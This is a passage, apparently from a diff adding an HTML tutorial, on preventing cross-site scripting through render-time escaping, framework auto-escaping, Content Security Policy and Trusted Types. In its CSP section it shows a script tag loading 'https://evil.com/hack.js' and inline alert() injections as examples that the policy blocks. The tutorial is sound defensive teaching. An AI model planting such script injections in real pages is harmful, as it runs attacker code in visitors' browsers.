+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/comments&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> escaped <span class="op">=</span> <span class="fu">escapeHtml</span>(req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">comment</span>)<span class="op">;</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>  db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">insert</span>(escaped)<span class="op">;</span> <span class="co">// Don&#39;t do this</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="co">// Good - escape at render time</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/post/:id&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comments <span class="op">=</span> db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">findByPostId</span>(req<span class="op">.</span><span class="at">params</span><span class="op">.</span><span class="at">id</span>)<span class="op">;</span></span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`</span></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a><span class="vs">    </span><span class="sc">${</span>comments<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> <span class="vs">`&lt;div&gt;</span><span class="sc">${</span><span class="fu">escapeHtml</span>(c)<span class="sc">}</span><span class="vs">&lt;/div&gt;`</span>)<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)<span class="sc">}</span></span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a><span class="vs">  `</span>)<span class="op">;</span></span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<h3 id="use-framework-features">2. Use Framework Features</h3>
+<p>Modern frameworks provide XSS protection by default. Use these
+built-in protections instead of writing your own escaping code:</p>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co">// React automatically escapes values in JSX</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">Comment</span>({ text }) {</span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="op">&lt;</span>div<span class="op">&gt;</span>{text}<span class="op">&lt;/</span>div<span class="op">&gt;;</span>  <span class="co">// Safe by default</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="co">// Angular automatically escapes interpolated values</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div<span class="op">&gt;</span>{{comment}}<span class="op">&lt;/</span>div<span class="op">&gt;</span>  <span class="co">// Safe by default</span></span></code></pre></div>
+<h3 id="content-security-policy-csp">3. Content Security Policy
+(CSP)</h3>
+<p>Content Security Policy is a powerful defense mechanism that helps
+prevent XSS attacks even when other protections fail. While escaping and
+sanitization try to prevent malicious code injection, CSP provides an
+additional layer of security by controlling what resources a page can
+load and execute.</p>
+<p>CSP acts as a security guard that checks every resource (scripts,
+images, styles, etc.) before allowing them to load. By default, CSP
+blocks potentially dangerous resources unless explicitly allowed by the
+policy.</p>
+<h4 id="how-csp-works">How CSP Works</h4>
+<p>When you serve a webpage, you can include a special HTTP response
+header called <code>Content-Security-Policy</code> that tells the
+browser what resources are allowed to load. For example:</p>
+<pre class="http"><code>Content-Security-Policy: default-src &#39;self&#39;</code></pre>
+<p>This simple policy tells the browser: “Only load resources from our
+own domain.” This means:</p>
+<ul>
+<li>✅ <code>&lt;script src="/js/app.js"&gt;</code> is allowed (same
+domain)</li>
+<li>❌ <code>&lt;script src="https://evil.com/hack.js"&gt;</code> is
+blocked (different domain)</li>
+<li>❌ <code>&lt;script&gt;alert('hello')&lt;/script&gt;</code> is
+blocked (inline script)</li>
+<li>❌ <code>&lt;div onclick="alert('hi')"&gt;</code> is blocked (inline
+event handler)</li>
+</ul>
+<h4 id="csp-directives">CSP Directives</h4>
+<p>CSP provides fine-grained control through different directives. Here
+are the most important ones:</p>
+<ol type="1">
+<li><strong>Resource Loading Directives:</strong>
+<ul>
+<li><code>default-src</code>: The fallback for other resource types</li>
+<li><code>script-src</code>: Controls JavaScript sources</li>
+<li><code>style-src</code>: Controls CSS sources</li>
+<li><code>img-src</code>: Controls image sources</li>
+<li><code>connect-src</code>: Controls fetch(), XHR, WebSocket
+connections</li>
+<li><code>frame-src</code>: Controls what can be embedded in
+iframes</li>
+</ul></li>
+<li><strong>Special Directives:</strong>
+<ul>
+<li><code>base-uri</code>: Controls allowed URLs in
+<code>&lt;base&gt;</code> tags</li>
+<li><code>form-action</code>: Controls where forms can submit to</li>
+<li><code>frame-ancestors</code>: Controls which sites can embed your
+page</li>
+<li><code>report-uri</code>: Where to send violation reports</li>
+</ul></li>
+</ol>
+<h4 id="common-csp-values">Common CSP Values</h4>
+<p>For each directive, you can specify various types of allowed
+sources:</p>
+<pre class="http"><code>Content-Security-Policy:
+    script-src
+        &#39;self&#39;                   # Same origin
+        https://trusted.com      # Specific domain
+        *.trusted.com            # Subdomains
+        &#39;unsafe-inline&#39;          # Inline scripts (dangerous!)
+        &#39;unsafe-eval&#39;            # eval() (dangerous!)
+        &#39;nonce-random123&#39;        # Specific inline scripts
+        &#39;strict-dynamic&#39;         # Trust scripts loaded by trusted scripts</code></pre>
+<h4 id="an-example-csp">An example CSP</h4>
+<p>Let’s build a policy for a website that needs to: 1. Load its own
+resources 2. Use Google Analytics 3. Load images from a CDN 4. Prevent
+framing from other sites</p>
+<p>The policy would look as follows:</p>
+<pre class="http"><code>Content-Security-Policy:
+    default-src &#39;self&#39;;                                 # Base rule
+    script-src &#39;self&#39; https://www.google-analytics.com; # GA scripts
+    img-src &#39;self&#39; https://cdn.example.com;             # Images
+    frame-ancestors &#39;none&#39;;                             # No framing</code></pre>
+<h4 id="modern-csp-best-practices">Modern CSP Best Practices</h4>
+<ol type="1">
+<li><p><strong>Use Nonces for Inline Scripts:</strong> Instead of
+‘unsafe-inline’, use <strong><em>random</em></strong> nonces to allow
+specific inline scripts:</p>
+<pre class="http"><code>Content-Security-Policy: script-src &#39;nonce-random123&#39;</code></pre>
+<div class="sourceCode" id="cb29"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="ot"> nonce</span><span class="op">=</span><span class="st">&quot;random123&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This inline script is allowed</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>An XSS attacker would not be able to predict the random nonce, so
+they would not be able to inject a <code>&lt;script&gt;</code> tag that
+the CSP would allow execution of.</p></li>
+<li><p><strong>Use strict-dynamic:</strong> This modern approach
+simplifies policies for complex applications:</p>
+<pre class="http"><code>Content-Security-Policy:
+    script-src &#39;strict-dynamic&#39; &#39;nonce-random123&#39;</code></pre>
+<p>This allows scripts loaded by trusted scripts, regardless of their
+origin.</p></li>
+</ol>
+<h3 id="trusted-types">4. Trusted Types</h3>
+<p><a
+href="https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API">Trusted
+Types</a> is a new browser security feature that enforces explicit
+sanitization before using dangerous APIs like <code>innerHTML</code> or
+<code>eval()</code>. To use it:</p>
+<ol type="1">
+<li>Enable it in your CSP header:</li>
+</ol>
+<pre class="http"><code>Content-Security-Policy: trusted-types myPolicy;</code></pre>
+<ol start="2" type="1">
+<li>Create a policy for sanitizing HTML:</li>
+</ol>
+<div class="sourceCode" id="cb32"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> policy <span class="op">=</span> trustedTypes<span class="op">.</span><span class="fu">createPolicy</span>(<span class="st">&#39;myPolicy&#39;</span><span class="op">,</span> {</span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">createHTML</span><span class="op">:</span> (string) <span class="kw">=&gt;</span> {</span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="fu">htmlEscape</span>(string)<span class="op">;</span> <span class="co">// Use a sanitizer</span></span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<ol start="3" type="1">
+<li>Use the policy to create trusted HTML:</li>
+</ol>
+<div class="sourceCode" id="cb33"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">displayUserContent</span>(userId) {</span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> response <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(<span class="vs">`/api/content/</span><span class="sc">${</span>userId<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> data <span class="op">=</span> <span class="cf">await</span> response<span class="op">.</span><span class="fu">text</span>()<span class="op">;</span></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This throws an error due to Trusted Types policy:</span></span>
+<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;content&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> data<span class="op">;</span></span>
+<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">// This works safely due to sanitization:</span></span>
+<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> safeHtml <span class="op">=</span> policy<span class="op">.</span><span class="fu">createHTML</span>(data)<span class="op">;</span></span>
+<span id="cb33-10"><a href="#cb33-10" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;content&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> safeHtml<span class="op">;</span></span>
+<span id="cb33-11"><a href="#cb33-11" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<h2 id="conclusion">Conclusion</h2>
+<p>Cross-Site Scripting remains one of the most prevalent and dangerous
+web vulnerabilities, in part because attack payloads can come from
+countless sources - not just form inputs and URLs, but also unexpected
+vectors like OCR-processed images or system configurations. Each context
+where untrusted data appears requires specific protections, and some
+contexts should never include untrusted data at all.</p>
+<p>Modern web security provides essential layers of XSS defense through
+framework-level protections, context-aware escaping, Content Security
+Policy headers, and the Trusted Types API. However, these tools are only
+effective when used properly. The key to XSS prevention is adopting a
+security-first mindset: treat all external data as potentially
+malicious, prefer restrictive security policies, and carefully review
+any code that generates HTML or JavaScript dynamically.</p>
